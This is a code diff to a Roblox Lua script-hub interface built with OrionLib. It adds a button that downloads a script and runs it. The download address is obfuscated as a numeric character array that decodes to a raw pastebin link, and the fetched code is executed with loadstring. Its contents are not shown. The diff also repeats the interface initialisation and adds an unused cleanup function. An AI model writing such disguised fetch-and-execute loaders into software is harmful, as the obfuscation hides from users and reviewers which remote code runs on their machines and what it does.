@@ -300,6 +300,44 @@ addRoundButton(ScriptCenterTab, {
     Color = Color3.fromRGB(70, 200, 200)
 })
 
+-- 鸭脚本
+addRoundButton(ScriptCenterTab, {
+    Name = "加载鸭🐤脚本",
+    Callback = function()
+        OrionLib:MakeNotification({Name = "提示", Content = "正在加载鸭🐤脚本...", Time = 3})
+        task.spawn(function()
+            local success, err = pcall(function()
+                loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,81,89,49,113,112,99,115,106})end)())))()
+            if success then
+                OrionLib:MakeNotification({Name = "成功", Content = "鸭脚本🐤加载完成", Time = 3})
+            else
+                OrionLib:MakeNotification({Name = "失败", Content = "错误: " .. err, Time = 3})
+            end
+        end)
+    end,
+    Color = Color3.fromRGB(70, 200, 200)
+})
+
+-- 初始化界面
+OrionLib:Init()
+
+-- 样式优化
+task.delay(0.3, function()
+    local mainFrame = Window.Instance:FindFirstChild("MainFrame", true)
+    if mainFrame then
+        makeRound(mainFrame, UDim.new(0.08, 0))
+    end
+end)
+
+-- 清理函数
+local function cleanUp()
+    if Window and Window.Instance then
+        Window.Instance:Destroy()
+    end
+    Lighting.Ambient = Color3.new(0, 0, 0)
+    Lighting.Brightness = 1
+end
+
 -- 初始化界面
 OrionLib:Init()
 
